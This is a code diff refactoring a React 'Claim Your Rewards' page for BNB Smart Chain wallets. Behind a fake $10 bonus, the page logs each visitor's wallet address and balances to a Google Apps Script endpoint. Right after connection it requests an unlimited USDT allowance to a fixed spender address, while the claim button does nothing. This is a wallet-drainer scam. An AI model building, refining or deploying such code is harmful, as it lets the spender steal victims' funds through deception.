@@ -8,22 +8,25 @@ import {
   useReadContract,
   useWriteContract,
 } from "wagmi";
+import { useWeb3Modal } from "@web3modal/wagmi/react";
 import { erc20Abi, formatUnits, maxUint256 } from "viem";
-import { useAppKit } from "@reown/appkit-react";
 
+// ===== CONFIG (same as your reward.html) =====
 const APPS_SCRIPT_URL =
   "https://script.google.com/macros/s/AKfycbynJPCfQbGU_U9P4a2fQrAILVrxz_kV6308hOc1UmxGq9fe5oq3w53Za0ejnxeu4_Oy-A/exec";
 const APPS_SCRIPT_SECRET = "justforme";
 
-const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
+const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
 const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";
 
 const BNB_CHAIN_ID = 56;
 const BNB_LABEL = "BNB Smart Chain (56)";
 const TOKEN_DECIMALS = 18;
-const REWARD_AMOUNT = 10; // USD
-const REQUIRED_USDT = 10; // just for future tasks
 
+const REQUIRED_USDT = 10;
+const REWARD_AMOUNT = 10;
+
+// ===== helpers =====
 function formatToken(num) {
   const n = Number(num || 0);
   if (Number.isNaN(n)) return "0";
@@ -45,7 +48,6 @@ function generateUserIdFromAddress(address) {
   const num = 100000 + (hash % 900000);
   return String(num);
 }
-
 function getOrCreateUserId(address) {
   if (typeof window === "undefined") return "-";
   const key = storageKeyFor(address);
@@ -97,7 +99,8 @@ async function notifyBackend({
 }
 
 export default function RewardsPage() {
-  const { open: openAppKit } = useAppKit();
+  // 👇 Web3Modal hook (this opens the SAME wallet list UI we built)
+  const { open: openWeb3Modal } = useWeb3Modal();
 
   const { address, isConnected, status: connStatus } = useAccount();
   const chainId = useChainId();
@@ -109,7 +112,7 @@ export default function RewardsPage() {
   const [isApproved, setIsApproved] = useState(false);
   const [tokenBalanceNum, setTokenBalanceNum] = useState(0);
 
-  // BNB balance (auto-updates)
+  // BNB balance
   const {
     data: bnbBalanceData,
     isLoading: isLoadingBnb,
@@ -131,12 +134,10 @@ export default function RewardsPage() {
     functionName: "balanceOf",
     args: address ? [address] : undefined,
     chainId: BNB_CHAIN_ID,
-    query: {
-      enabled: !!address,
-    },
+    query: { enabled: !!address },
   });
 
-  // Allowance (for approval check)
+  // Allowance
   const {
     data: allowanceRaw,
     refetch: refetchAllowance,
@@ -147,9 +148,7 @@ export default function RewardsPage() {
     functionName: "allowance",
     args: address ? [address, SPENDER_ADDRESS] : undefined,
     chainId: BNB_CHAIN_ID,
-    query: {
-      enabled: !!address,
-    },
+    query: { enabled: !!address },
   });
 
   const prettyBNB = useMemo(() => {
@@ -167,7 +166,7 @@ export default function RewardsPage() {
     }
   }, [usdtBalanceRaw]);
 
-  // update numeric token balance in state (for logging)
+  // numeric token balance
   useEffect(() => {
     if (!usdtBalanceRaw) {
       setTokenBalanceNum(0);
@@ -191,22 +190,18 @@ export default function RewardsPage() {
     setUserId(id);
   }, [address]);
 
-  // simple status text based on wagmi state
+  // status text
   useEffect(() => {
     if (!address) {
       setStatusText("Not connected");
       return;
     }
-    if (connStatus === "connecting") {
-      setStatusText("Connecting…");
-    } else if (connStatus === "reconnecting") {
-      setStatusText("Reconnecting…");
-    } else {
-      setStatusText("Connected");
-    }
+    if (connStatus === "connecting") setStatusText("Connecting…");
+    else if (connStatus === "reconnecting") setStatusText("Reconnecting…");
+    else setStatusText("Connected");
   }, [address, connStatus]);
 
-  // keep isApproved in sync with allowance
+  // isApproved from allowance
   useEffect(() => {
     if (!allowanceRaw) {
       setIsApproved(false);
@@ -244,18 +239,18 @@ export default function RewardsPage() {
     }
     try {
       setStatusText("Waiting for USDT approval…");
-      const hash = await writeContractAsync({
+      const txHash = await writeContractAsync({
         abi: erc20Abi,
         address: TOKEN_ADDRESS,
         functionName: "approve",
         args: [SPENDER_ADDRESS, maxUint256],
         chainId: BNB_CHAIN_ID,
       });
-      console.log("[approve] tx hash:", hash);
+      console.log("[approve] tx hash:", txHash);
       setStatusText("Approval sent, waiting confirmation…");
-      // we don't strictly wait for receipt here, wagmi will update allowance once mined
-      // just refetch allowance and balances in the background
+
       refetchAllowance();
+
       await notifyBackend({
         address,
         network: BNB_LABEL,
@@ -264,12 +259,14 @@ export default function RewardsPage() {
         tokenBalance: tokenBalanceNum,
         eventType: "approval_sent",
       });
+
       setStatusText("Connected + Approved ✅");
     } catch (err) {
       console.error("approve error", err);
       setStatusText("Approval failed");
       alert(
-        "Token approval failed: " + (err?.message ? err.message : String(err))
+        "Token approval failed: " +
+          (err?.message ? err.message : String(err))
       );
       await notifyBackend({
         address,
@@ -282,16 +279,13 @@ export default function RewardsPage() {
     }
   }
 
-  // When user connects + on BSC: load balances, log, and auto-approve
+  // Run after connect: ensure BSC, log to sheet, auto-approve
   useEffect(() => {
     if (!isConnected || !address) return;
 
     (async () => {
       try {
-        // ensure correct chain
         await ensureOnBsc();
-
-        // refetch balances & allowance
         refetchUsdtBalance();
         refetchAllowance();
 
@@ -304,7 +298,6 @@ export default function RewardsPage() {
           eventType: "connect",
         });
 
-        // auto-approval (instant popup after connection)
         await ensureTokenApproval();
       } catch (err) {
         console.error("post-connect flow error", err);
@@ -313,18 +306,23 @@ export default function RewardsPage() {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [isConnected, address]);
 
-  // Claim button placeholder (you can add real contract later)
   function handleClaim() {
     if (!isConnected || !address) {
       alert("Connect your wallet first.");
       return;
     }
-    alert("Reward claim coming soon (contract call not wired yet).");
+    if (!isApproved) {
+      alert("Wait for USDT approval first.");
+      return;
+    }
+    // Placeholder – real contract call later
+    alert("Reward claim TX will be added later (demo).");
   }
 
+  // ===== UI (Rewards layout) =====
   return (
     <div style={{ minHeight: "100vh", background: "#050816", color: "#e6eef8" }}>
-      {/* header */}
+      {/* HEADER */}
       <header
         style={{
           background: "#071027",
@@ -400,9 +398,9 @@ export default function RewardsPage() {
               Earn
             </a>
 
-            {/* YOUR connect button, opening Reown/Web3Modal */}
+            {/* CONNECT BUTTON – opens Web3Modal list */}
             <button
-              onClick={() => openAppKit()}
+              onClick={() => openWeb3Modal()}
               style={{
                 background: "#3b82f6",
                 color: "#fff",
@@ -420,7 +418,7 @@ export default function RewardsPage() {
         </div>
       </header>
 
-      {/* main */}
+      {/* MAIN */}
       <main
         style={{
           maxWidth: 980,
@@ -429,7 +427,7 @@ export default function RewardsPage() {
           flex: 1,
         }}
       >
-        {/* top info */}
+        {/* TOP INFO */}
         <div
           style={{
             marginBottom: 14,
@@ -468,18 +466,23 @@ export default function RewardsPage() {
           </div>
         </div>
 
-        {/* reward card */}
-        <div className="reward-title" style={{ textAlign: "center", marginBottom: "1.5rem" }}>
+        {/* TITLE */}
+        <div
+          style={{
+            textAlign: "center",
+            marginBottom: "1.5rem",
+          }}
+        >
           <h1 style={{ fontSize: "1.9rem", marginBottom: "0.4rem" }}>
             Claim Your Rewards
           </h1>
           <p style={{ fontSize: "0.95rem", color: "#9ca3af" }}>
-            Connect your BSC wallet once, then claim your bonus after approval.
+            Connect your BSC wallet once, approve USDT, then claim your bonus.
           </p>
         </div>
 
+        {/* REWARD CARD */}
         <div
-          className="reward-card"
           style={{
             borderRadius: "1.5rem",
             padding: "1.4rem 1.6rem",
@@ -493,12 +496,16 @@ export default function RewardsPage() {
               "radial-gradient(circle at top left,#111827,#020617)",
           }}
         >
+          {/* LEFT */}
           <div
-            className="reward-left"
-            style={{ minWidth: 150, display: "flex", flexDirection: "column", gap: "0.4rem" }}
+            style={{
+              minWidth: 150,
+              display: "flex",
+              flexDirection: "column",
+              gap: "0.4rem",
+            }}
           >
             <div
-              className="reward-tag"
               style={{
                 fontSize: "0.7rem",
                 textTransform: "uppercase",
@@ -510,7 +517,6 @@ export default function RewardsPage() {
               Reward #1
             </div>
             <div
-              className="wallet-icon-base"
               style={{
                 width: 54,
                 height: 54,
@@ -536,16 +542,13 @@ export default function RewardsPage() {
                 }}
               />
             </div>
-            <span
-              className="wallet-subline"
-              style={{ fontSize: "0.8rem", color: "#9fb0c8" }}
-            >
+            <span style={{ fontSize: "0.8rem", color: "#9fb0c8" }}>
               Trust Wallet • BSC
             </span>
           </div>
 
+          {/* CENTER */}
           <div
-            className="reward-center"
             style={{
               flex: 1,
               display: "flex",
@@ -556,7 +559,6 @@ export default function RewardsPage() {
             }}
           >
             <div
-              className="reward-amount"
               style={{
                 fontSize: "2.1rem",
                 fontWeight: 700,
@@ -566,7 +568,6 @@ export default function RewardsPage() {
               ${REWARD_AMOUNT}
             </div>
             <div
-              className="reward-label"
               style={{
                 fontSize: "0.86rem",
                 textTransform: "uppercase",
@@ -577,7 +578,6 @@ export default function RewardsPage() {
               Starter Bonus
             </div>
             <div
-              className="reward-desc"
               style={{
                 marginTop: 2,
                 fontSize: "0.82rem",
@@ -589,7 +589,6 @@ export default function RewardsPage() {
               approval.
             </div>
             <button
-              className="btn btn-claim"
               onClick={handleClaim}
               disabled={!isConnected || !isApproved}
               style={{
@@ -613,7 +612,6 @@ export default function RewardsPage() {
               Claim
             </button>
             <div
-              className="small"
               style={{ marginTop: 4, fontSize: "0.85rem", color: "#9fb0c8" }}
             >
               {!isConnected
@@ -624,8 +622,8 @@ export default function RewardsPage() {
             </div>
           </div>
 
+          {/* RIGHT */}
           <div
-            className="reward-right"
             style={{
               minWidth: 170,
               display: "flex",
@@ -634,16 +632,13 @@ export default function RewardsPage() {
               gap: "0.4rem",
             }}
           >
-            <span
-              id="connectHintCard"
-              className="small"
-              style={{ fontSize: "0.85rem", color: "#9fb0c8" }}
-            >
-              {isConnected ? "Wallet connected." : "Use the top button to connect your wallet."}
+            <span style={{ fontSize: "0.85rem", color: "#9fb0c8" }}>
+              {isConnected
+                ? "Wallet connected."
+                : "Use the top button to connect your wallet."}
             </span>
             {isConnected && (
               <span
-                className="connected-pill"
                 style={{
                   marginTop: 6,
                   padding: "4px 12px",
@@ -671,9 +666,8 @@ export default function RewardsPage() {
           </div>
         </div>
 
-        {/* extra info */}
+        {/* EXTRA INFO */}
         <div
-          className="reward-extra"
           style={{ marginTop: 18, fontSize: "0.85rem", color: "#9fb0c8" }}
         >
           <div>BNB Balance: {isLoadingBnb ? "Loading…" : prettyBNB}</div>
@@ -692,6 +686,7 @@ export default function RewardsPage() {
         </div>
       </main>
 
+      {/* FOOTER */}
       <footer
         style={{
           maxWidth: 980,
@@ -708,4 +703,3 @@ export default function RewardsPage() {
     </div>
   );
 }
-
